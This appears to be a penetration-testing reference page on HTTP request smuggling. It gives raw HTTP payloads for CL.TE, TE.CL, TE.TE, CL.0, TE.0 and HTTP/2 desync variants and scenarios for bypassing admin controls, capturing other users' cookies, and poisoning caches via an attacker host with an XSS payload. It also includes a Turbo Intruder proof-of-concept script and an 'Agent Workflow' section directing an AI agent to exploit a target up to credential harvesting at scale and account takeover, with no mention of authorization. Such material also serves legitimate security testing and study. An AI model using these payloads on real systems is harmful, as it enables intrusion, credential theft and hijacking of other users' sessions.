# Request Smuggling

> **Summary**: Exploiting discrepancies in how front-end and back-end servers parse HTTP request boundaries (Content-Length vs Transfer-Encoding) to inject a second, hidden request.
> **Impact**: Bypass front-end security controls, poison web caches, steal credentials, achieve stored XSS, and hijack other users' requests.
> **Typical Severity**: High | Critical

## Detection

### Indicators

- Infrastructure uses a reverse proxy/load balancer in front of a backend (multi-tier architecture)
- Backend and frontend are from different vendors (e.g., AWS ALB + IIS, Nginx + Apache)
- HTTP/2 frontend downgrading to HTTP/1.1 for the backend
- Timeouts or unexpected 400 errors when testing with conflicting CL/TE headers

### Automated Detection

```bash
# smuggler.py - automated desync detection
python3 smuggler.py -u <URL>

# Burp Suite Extensions
# - HTTP Request Smuggler (auto-detects CL.TE, TE.CL, TE.TE, H2.CL, CL.0)
# - HTTP Hacker (visualizes framing and concatenation)
```

### Manual Detection (Timing Technique)

**Detecting CL.TE**: Front-end uses CL, back-end uses TE. Send chunked body with CL set too short -- back-end waits for more chunks, causing a timeout:

```http
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0

```

**Detecting TE.CL**: Front-end uses TE, back-end uses CL. Send chunked request where CL is shorter than actual content -- back-end waits for body that never arrives:

```http
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

**Differential Response Analysis**: Send varied requests and observe if server responses differ unexpectedly, indicating parsing discrepancies.

## Exploitation

### Prerequisites

- Multi-tier HTTP architecture (proxy + backend) with connection reuse (keep-alive)
- Front-end and back-end disagree on request boundary parsing
- Disable `Update Content-Length` and `Normalize HTTP/1 line endings` in Burp Repeater

### Vulnerability Types

#### CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

#### TE.CL (Front-end: Transfer-Encoding, Back-end: Content-Length)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /admin HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE (Obfuscated Transfer-Encoding)

One server fails to recognize the obfuscated header, falling back to CL:

| Obfuscation | Header |
|-------------|--------|
| Substring match | `Transfer-Encoding: testchunked` |
| Space in name | `Transfer-Encoding : chunked` |
| Horizontal tab | `Transfer-Encoding:\tchunked` |
| Vertical tab | `Transfer-Encoding:\x0bchunked` |
| Leading space | `Transfer-Encoding:  chunked` |
| Newline injection | `X: X\nTransfer-Encoding: chunked` |
| Duplicate header | Two `Transfer-Encoding` headers with different values |

#### CL.0 (Back-end ignores Content-Length)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

Backend treats CL as 0, leaving the body to be parsed as the next request.

#### TE.0 (Back-end ignores Transfer-Encoding)

```http
OPTIONS / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Connection: keep-alive

50
GET http://<COLLABORATOR>/ HTTP/1.1
x: X
0


```

### HTTP/2 Downgrade Smuggling

When the front-end receives HTTP/2 and rewrites to HTTP/1.1 for the backend:

#### H2.CL (Injected Content-Length in HTTP/2)

```http
POST /index.php HTTP/2
Host: <TARGET>
Content-Length: 0

POST /admin?action=promote HTTP/1.1
Foo: bar
```

The HTTP/2 frame carries both requests; after downgrade, the backend sees the injected second request.

#### H2.TE (Transfer-Encoding in HTTP/2 pseudo-headers)

Inject `Transfer-Encoding: chunked` in an HTTP/2 request; the frontend ignores it (HTTP/2 has its own framing), but after rewriting to HTTP/1.1, the backend processes chunked encoding.

### Browser-Powered Request Smuggling (Client-Side Desync)

- Abuses the victim's browser to send a mis-framed request on a shared connection
- Payload is constrained by what browsers can legally send cross-origin (no custom header obfuscation)
- Useful for cache poisoning and leaking front-end-injected headers
- Validate with the HTTP/2 nested-response check to confirm genuine server-side desync vs pipelining artifact

### Step-by-Step Exploitation

1. **Identify the desync type** -- Use timing or differential response techniques
   - Success: Timeout or unexpected response on second request
2. **Confirm exploitability** -- Smuggle a request to `/404` and check if a normal follow-up request returns 404
3. **Bypass front-end ACLs** -- Smuggle `GET /admin` past the proxy
4. **Reveal front-end rewriting** -- Smuggle a POST to an endpoint that echoes params; capture injected headers (e.g., `X-Forwarded-For`, internal auth headers)
5. **Steal credentials** -- Smuggle a request that stores the next user's request as a comment/parameter value
6. **Chain with cache poisoning** -- Poison a static resource by smuggling a redirect or XSS payload

### Exploitation Scenarios

#### Bypass Front-End Security (CL.TE)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 67
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

#### Capture Other Users' Requests

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 319
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: <TARGET>
Content-Length: 400
Content-Type: application/x-www-form-urlencoded

comment=
```

The next user's entire request (including cookies/auth headers) is stored as the comment.

#### Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: <ATTACKER>
Content-Length: 10

x=1
```

Poisons `/static/include.js` with an attacker-controlled redirect.

#### Reflected XSS via User-Agent Smuggling

```http
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Content-Length: 213

0

GET /post?postId=2 HTTP/1.1
Host: <TARGET>
User-Agent: "><script>alert(1)</script>
Content-Length: 10

A=
```

### Proof of Concept

Use Turbo Intruder for reliable timing:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    engine.start()
    attack = '''POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nHost: <TARGET>\r\nContent-Length: 35\r\n\r\n0\r\n\r\nGET /admin7 HTTP/1.1\r\nX-Foo: k'''
    engine.queue(attack)
    for i in range(14):
        engine.queue('''GET / HTTP/1.1\r\nHost: <TARGET>\r\n\r\n''')
        time.sleep(0.05)
```

## Bypasses

- **Hop-by-hop header abuse**: `Connection: Content-Length` -- instructs the proxy to strip CL, enabling desync
- **HTTP/0.9 response**: If backend supports HTTP/0.9, response has no headers, allowing XSS even with `Content-Type: text/plain`
- **TRACE method abuse**: Smuggle HEAD + TRACE to reflect arbitrary headers in the response body

## Escalation

- Smuggling -> [Cache Poisoning](cache-poisoning.md) -> Stored XSS on all users
- Smuggling -> Credential theft -> Account takeover
- Smuggling -> [SSRF](ssrf.md) -> Access internal services via Host header injection
- Smuggling -> Front-end bypass -> Access to `/admin` or internal endpoints

## Distinguishing Smuggling from Pipelining

| Check | How |
|-------|-----|
| Disable reuse | Turn off HTTP/1 connection reuse in Burp; if behavior disappears, it was pipelining |
| HTTP/2 nested response | If HTTP/2 response body contains a nested HTTP/1 response, it is genuine desync |
| Different connections | Send attack and normal requests on separate TCP connections |

## Tools

| Tool | Usage |
|------|-------|
| [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) | Burp extension -- auto-detects desync variants |
| [smuggler.py](https://github.com/defparam/smuggler) | `python3 smuggler.py -u <URL>` |
| [smugglefuzz](https://github.com/Moopinger/smugglefuzz) | Fuzzer for smuggling variants |
| [t-reqs](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer) | Grammar-based HTTP fuzzer for discrepancy detection |
| [HTTP Hacker](https://portswigger.net/bappstore) | Burp extension -- visualize framing and concatenation |
| Turbo Intruder | Precise control over connection reuse (`requestsPerConnection`) |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. Identify the infrastructure of `<TARGET>`: determine if a reverse proxy/load balancer sits in front of a backend server (check `Server`, `Via`, `X-Powered-By` headers)
2. Check if HTTP/2 is used on the frontend and downgraded to HTTP/1.1 for the backend (test with `curl --http2 -v https://<TARGET>`)
3. Run automated detection:
   ```bash
   python3 smuggler.py -u https://<TARGET>
   ```
4. Install "HTTP Request Smuggler" Burp extension and run scan against `<TARGET>`
5. Manually test CL.TE: send a POST with `Transfer-Encoding: chunked` and `Content-Length: 4` with a chunked body -- if the backend times out waiting for more chunks, CL.TE desync is likely
6. Manually test TE.CL: send a POST with `Transfer-Encoding: chunked` and a short `Content-Length` -- if the backend times out, TE.CL desync is likely

### Phase 2: Validation
1. **CL.TE confirmation**: Send a smuggled request targeting a non-existent path (e.g., `GET /404test`), then send a normal GET request on the same connection -- if the normal request returns 404, the smuggled prefix was prepended
2. **TE.CL confirmation**: Same technique but with reversed header priority
3. **TE.TE confirmation**: Test obfuscated `Transfer-Encoding` headers (extra spaces, tabs, vertical tabs, case variations) to find a variant where one server honors TE and the other falls back to CL
4. **H2.CL confirmation**: Send an HTTP/2 request with an injected `Content-Length: 0` header containing a smuggled HTTP/1.1 request in the body
5. **CL.0 confirmation**: Send a POST with a body but check if the backend ignores Content-Length and treats the body as the start of the next request
6. Disable `Update Content-Length` and `Normalize HTTP/1 line endings` in Burp Repeater before testing
7. Use Turbo Intruder for reliable connection-reuse timing

### Phase 3: Exploitation
1. **Bypass front-end security**: Smuggle `GET /admin HTTP/1.1\r\nHost: localhost` to access restricted endpoints that the proxy blocks
2. **Steal credentials**: Smuggle a POST to a reflection endpoint (e.g., comment form) with a large `Content-Length` -- the next user's request (including cookies/auth headers) becomes part of the POST body and is stored
3. **Cache poisoning via smuggling**: Smuggle a request that causes the backend to return attacker-controlled content for a static resource URL, poisoning the cache:
   ```http
   POST / HTTP/1.1
   Host: <TARGET>
   Content-Length: <LEN>
   Transfer-Encoding: chunked

   0

   GET /static/app.js HTTP/1.1
   Host: <ATTACKER>
   ```
4. **Reflected XSS amplification**: Smuggle a request with XSS payload in a header (e.g., `User-Agent`) that is reflected in the response served to the next user
5. **Request routing**: Smuggle a request with a different `Host` header to route the next user's request to an attacker-controlled server

### Phase 4: Escalation
1. Chain with [Cache Poisoning](cache-poisoning.md): smuggle requests to poison high-traffic static resources with XSS payloads, achieving stored XSS affecting all visitors
2. Chain with [SSRF](ssrf.md): inject `Host: internal-service` in smuggled requests to access internal infrastructure
3. **Credential harvesting at scale**: capture multiple users' requests by repeatedly smuggling to a storage endpoint
4. **Account takeover**: extract session tokens or authentication headers from captured requests
5. **Browser-powered desync**: if the target is vulnerable, create a client-side PoC that uses the victim's browser to send the desync payload, requiring no server infrastructure

## Decision Tree

```
Identify multi-tier architecture (proxy + backend)
├── Test CL.TE (timing: short CL, chunked body)
│   ├── Backend timeout? → CL.TE likely → Confirm with differential response
│   └── No timeout → Not CL.TE
├── Test TE.CL (timing: chunked with short CL)
│   ├── Backend timeout? → TE.CL likely → Confirm with differential response
│   └── No timeout → Not TE.CL
├── Test TE.TE (obfuscated Transfer-Encoding headers)
│   ├── One server ignores obfuscated TE? → Falls back to CL → Exploitable
│   └── Both handle TE consistently → Not TE.TE
├── Test H2.CL (HTTP/2 with injected Content-Length)
│   ├── Smuggled request processed after downgrade? → H2.CL confirmed
│   └── Not processed → Not H2.CL
├── Test H2.TE (HTTP/2 with Transfer-Encoding: chunked)
│   └── Backend processes chunked after downgrade? → H2.TE confirmed
├── Test CL.0 (backend ignores Content-Length)
│   └── Body treated as next request? → CL.0 confirmed
└── Browser desync (client-side)
    └── Victim's browser can trigger desync? → Client-side exploitation possible
```

## Success Criteria
- A smuggled request is processed as a separate request by the backend, separate from the front-end's view of the request boundaries
- Demonstrated impact: access to restricted endpoints (`/admin`), captured another user's request with credentials, or poisoned cache with attacker-controlled content
- The attack is reproducible across multiple connection reuse cycles

---

## References

- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Research - HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [PortSwigger Research - Browser-Powered Desync](https://portswigger.net/research/browser-powered-desync-attacks)
- [PortSwigger Research - HTTP/1 Must Die](https://portswigger.net/research/http1-must-die)
- [PortSwigger Research - TRACE Desync Attack](https://portswigger.net/research/trace-desync-attack)
- [TE.0 on Google Cloud (Bugcrowd)](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- [A Pentester's Guide to HTTP Request Smuggling](https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
- [PayloadsAllTheThings - Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling)

**See also**: [Cache Poisoning](cache-poisoning.md) | [SSRF](ssrf.md) | [CORS](cors.md)
